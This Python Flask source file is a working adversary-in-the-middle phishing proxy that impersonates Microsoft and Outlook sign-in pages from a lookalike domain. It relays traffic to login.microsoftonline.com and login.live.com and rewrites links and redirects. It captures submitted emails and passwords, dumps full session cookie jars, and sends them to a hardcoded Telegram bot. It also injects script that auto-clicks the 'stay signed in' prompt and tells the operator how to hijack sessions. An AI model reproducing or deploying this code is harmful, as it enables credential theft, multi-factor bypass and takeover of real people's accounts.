import os
import uuid
import requests
from flask import Flask, request, Response, make_response

app = Flask(__name__)

# --- Config ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

PROXY_DOMAIN = "https://outlook-verify.onrender.com"
PROXY_HOST = "outlook-verify.onrender.com"

visitor_sessions = {}
CAPTURED = {}

# Cookies worth grabbing first (but we send ALL of them anyway)
HIGH_VALUE = ["ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT", "RPSSecAuth",
              "SignInStateCookie", "MSPAuth", "MSPProf", "MSPProfV2", "MSPPre",
              "ANON", "WLSSC", "PPLState", "KMSI", "MSFPC", "MSPRequ", "X-OWA-CANARY"]

# --- Telegram ---
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
        print(f"[TG] Status: {resp.status_code}")
        if resp.status_code != 200:
            print(f"[TG ERROR] {resp.text}")
    except Exception as e:
        print(f"[TG EXCEPT] {e}")

# --- Helpers ---
def get_set_cookies(resp):
    cookies = []
    raw = getattr(resp, "raw", None)
    if raw and hasattr(raw, "headers"):
        try:
            vals = raw.headers.getlist("Set-Cookie")
            if vals:
                return vals
        except:
            pass
        try:
            vals = raw.headers.get_all("Set-Cookie")
            if vals:
                return vals
        except:
            pass
    sc = resp.headers.get("Set-Cookie")
    if sc:
        return [sc]
    return []

def rewrite_links(text):
    replacements = [
        ("https://login.microsoftonline.com", PROXY_DOMAIN),
        ("https://login.live.com", PROXY_DOMAIN),
        ("https://account.live.com", PROXY_DOMAIN),
        ("//login.microsoftonline.com", "//" + PROXY_HOST),
        ("//login.live.com", "//" + PROXY_HOST),
        ("//account.live.com", "//" + PROXY_HOST),
    ]
    for old, new in replacements:
        text = text.replace(old, new)
    return text

def fix_set_cookie(header_value):
    if not header_value:
        return ""
    parts = [p.strip() for p in header_value.split(";") if p.strip()]
    kept = []
    for p in parts:
        lower = p.lower()
        if lower.startswith("domain=") or lower.startswith("path=") or lower.startswith("secure") or lower.startswith("samesite"):
            continue
        kept.append(p)
    kept.append("Path=/")
    kept.append("SameSite=Lax")
    return "; ".join(kept)

def get_session(vid, user_agent):
    if vid not in visitor_sessions:
        s = requests.Session()
        s.headers.update({
            "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        })
        visitor_sessions[vid] = s
    return visitor_sessions[vid]

def pick_upstream(path):
    if path.startswith(("ppsecure/", "GetCredentialType.srf")):
        return "https://login.live.com"
    return "https://login.microsoftonline.com"

def dump_all_cookies(vid):
    """Sharp cookie grabber: dump the ENTIRE session cookie jar."""
    info = CAPTURED.get(vid)
    if not info or info.get("sent_cookies"):
        return
    sess = visitor_sessions.get(vid)
    if not sess:
        return
    cookies = sess.cookies.get_dict()
    if not cookies:
        return
    # Only send once we actually see high-value auth cookies
    if not any(hv in cookies for hv in ["ESTSAUTH", "ESTSAUTHPERSISTENT", "RPSSecAuth", "WLSSC", "MSPAuth"]):
        return
    info["sent_cookies"] = True
    lines = []
    for k, v in cookies.items():
        lines.append(f"<code>{k}={v}</code>")
    cookie_str = "\n".join(lines)
    msg = (
        f"<b>🍪 SESSION COOKIES CAPTURED</b>\n\n"
        f"<b>Email:</b> <code>{info.get('email', 'Unknown')}</code>\n"
        f"<b>Password:</b> <code>{info.get('password', 'Unknown')}</code>\n\n"
        f"<b>All Cookies ({len(cookies)}):</b>\n{cookie_str}\n\n"
        f"<i>Load these in Cookie Editor for outlook.office.com / login.microsoftonline.com to hijack the session.</i>"
    )
    # Telegram has a 4096 char limit — chunk if needed
    if len(msg) > 4000:
        part = ""
        for line in lines:
            candidate = part + line + "\n"
            if len(candidate) > 3900:
                send_telegram(f"<b>🍪 COOKIES ({info.get('email', 'Unknown')})</b>\n\n" + part)
                part = line + "\n"
            else:
                part = candidate
        if part.strip():
            send_telegram(f"<b>🍪 COOKIES ({info.get('email', 'Unknown')}) cont.</b>\n\n" + part)
    else:
        send_telegram(msg)
    print(f"[COOKIE SENT] Vid {vid} | {len(cookies)} cookies")

@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])
def proxy(path):
    vid = request.cookies.get("vid")
    new_vid = False
    if not vid:
        vid = str(uuid.uuid4())
        new_vid = True
        send_telegram(f"<b>👋 New Visitor</b>\nVid: <code>{vid}</code>\nIP: {request.remote_addr}")
        print(f"[NEW VISITOR] {vid} from {request.remote_addr}")

    sess = get_session(vid, request.headers.get("User-Agent"))

    upstream_base = pick_upstream(path)
    target_url = f"{upstream_base}/{path}"
    if request.query_string:
        target_url += "?" + request.query_string.decode()

    headers = {}
    for h in ["Accept", "Accept-Language", "Content-Type", "Origin", "Referer"]:
        if h in request.headers:
            val = request.headers[h]
            if h in ["Referer", "Origin"]:
                val = val.replace(PROXY_DOMAIN, upstream_base)
            headers[h] = val

    try:
        if request.method == "POST":
            content_type = request.content_type or ""
            if "application/json" in content_type:
                json_data = request.get_json(silent=True)
                print(f"[JSON POST] Vid: {vid} | Data: {json_data}")
                if json_data:
                    check_capture_json(vid, json_data)
                resp = sess.post(target_url, json=json_data, headers=headers, allow_redirects=False, timeout=30)
            else:
                print(f"[FORM POST] Vid: {vid} | Keys: {list(request.form.keys())}")
                check_capture_form(vid, request.form)
                resp = sess.post(target_url, data=request.form, headers=headers, allow_redirects=False, timeout=30)
        elif request.method == "OPTIONS":
            resp_m = make_response()
            resp_m.headers['Access-Control-Allow-Origin'] = '*'
            resp_m.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
            resp_m.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp_m
        else:
            resp = sess.get(target_url, headers=headers, allow_redirects=False, timeout=30)
    except Exception as e:
        print(f"[PROXY ERROR] {e}")
        return f"Proxy Error: {str(e)}", 502

    # === SHARP COOKIE CHECK: run on EVERY response ===
    dump_all_cookies(vid)

    r = Response(status=resp.status_code)

    if "Location" in resp.headers:
        loc = resp.headers["Location"]
        loc = loc.replace("https://login.microsoftonline.com", PROXY_DOMAIN)
        loc = loc.replace("https://login.live.com", PROXY_DOMAIN)
        loc = loc.replace("https://account.live.com", PROXY_DOMAIN)
        if loc.startswith("/"):
            loc = PROXY_DOMAIN + loc
        r.headers["Location"] = loc

    content_type = resp.headers.get("Content-Type", "")
    body = resp.content

    if "text/html" in content_type:
        text = body.decode("utf-8", errors="ignore")
        text = rewrite_links(text)
        inject_script = """
        <script>
        setTimeout(function() {
            var btn = document.querySelector('#idSIButton9, input[type="submit"][value="Yes"], button[type="submit"]');
            if (btn) {
                console.log('[PHISH] Auto-clicking KMSI');
                btn.click();
            }
        }, 1000);
        </script>
        """
        if "</body>" in text:
            text = text.replace("</body>", inject_script + "</body>")
        body = text.encode("utf-8")
    elif "text/css" in content_type:
        body = rewrite_links(body.decode("utf-8", errors="ignore")).encode("utf-8")
    elif "application/json" in content_type:
        try:
            body = rewrite_links(body.decode("utf-8")).encode("utf-8")
        except:
            pass

    r.set_data(body)
    if content_type:
        r.headers["Content-Type"] = content_type

    for cookie_header in get_set_cookies(resp):
        fixed = fix_set_cookie(cookie_header)
        if fixed:
            r.headers.add("Set-Cookie", fixed)

    if new_vid:
        r.set_cookie("vid", vid, max_age=86400, path="/", samesite="Lax", httponly=True)

    return r

def check_capture_form(vid, form_data):
    passwd = None
    email = None
    for key in ["passwd", "Password", "pwd", "password", "Passwd"]:
        if key in form_data:
            passwd = form_data[key]
            break
    for key in ["loginfmt", "login", "username", "EmailAddress", "user"]:
        if key in form_data:
            email = form_data[key]
            break
    if passwd:
        print(f"[CAPTURE FORM] Vid: {vid} | Email: {email} | Pass: {passwd}")
        save_capture(vid, email, passwd)

def check_capture_json(vid, json_data):
    passwd = None
    email = None

    def find_passwords(obj):
        nonlocal passwd, email
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k.lower() in ["passwd", "password", "pwd"] and isinstance(v, str):
                    passwd = v
                if k.lower() in ["loginfmt", "login", "username", "user"] and isinstance(v, str):
                    email = v
                else:
                    find_passwords(v)
        elif isinstance(obj, list):
            for item in obj:
                find_passwords(item)

    find_passwords(json_data)
    if passwd:
        print(f"[CAPTURE JSON] Vid: {vid} | Email: {email} | Pass: {passwd}")
        save_capture(vid, email, passwd)

def save_capture(vid, email, passwd):
    if vid not in CAPTURED:
        CAPTURED[vid] = {"sent_pw": False, "sent_cookies": False}
    CAPTURED[vid]["email"] = email
    CAPTURED[vid]["password"] = passwd
    if not CAPTURED[vid]["sent_pw"]:
        CAPTURED[vid]["sent_pw"] = True
        msg = (
            f"<b>🔑 PASSWORD CAPTURED</b>\n\n"
            f"<b>Email:</b> <code>{email}</code>\n"
            f"<b>Password:</b> <code>{passwd}</code>\n\n"
            f"<i>Waiting for session cookies...</i>"
        )
        send_telegram(msg)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
